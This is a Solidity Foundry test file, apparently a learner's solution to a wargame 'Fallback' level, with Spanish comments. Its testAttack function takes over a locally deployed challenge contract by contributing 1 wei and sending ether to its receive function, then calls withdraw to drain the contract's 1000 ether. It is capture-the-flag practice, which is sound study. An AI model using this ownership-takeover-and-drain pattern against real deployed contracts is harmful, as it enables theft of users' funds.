// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import {Test, console, console2} from "../lib/forge-std/src/Test.sol";
import {Fallback} from "../src/Fallback.sol";

contract FallbackTest is Test {
    Fallback fallbackTest;

    address public alice;
    address public bob;

    //addres 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2

    function setUp() public {
        fallbackTest = new Fallback();
        alice = makeAddr("alice");
        bob = makeAddr("bob");
    }

    //fallbackTest.owner = bob;

    function testAttack() public {
        //fallbackTest.owner =0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;
        vm.deal(alice, 2 wei);
        vm.deal(address(fallbackTest), 1000 ether);

        vm.startPrank(alice);
        fallbackTest.contribute{value: 1 wei}();
        //bool sent = fallbackTest.send{value: 0.000005 ether}(0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2);

        //payable(address(fallbackTest)).transfer(1 wei); da problemas de gas, usar call
        payable(address(fallbackTest)).call{value: 1 wei}("");

        //mosc
        /*function transfer (address payable _to)  public payable  {
      // This function is no longer recommended for sending Ether.
      _to.transfer(msg.value);*/

        fallbackTest.withdraw();

        vm.stopPrank();

        console.log("El owner es", 4);
    }

    fallback() external payable{

    }
    ///
    //address(fallbackTest).send{value: 0.000005 ether}();

    /*
      COMO ENVIO DINERO EN UNA TRANSACCIÓN EN FOUNDRY

      COMO LLAMO A LA FUNCIÓN RECEIVE EN FOUNDRY

      Llamar a contrato.contribute con poco ethereum
      Llamar a la función contrato.receive con poco ethereum
      Llamar a la función contrato.withdraw
    */
}
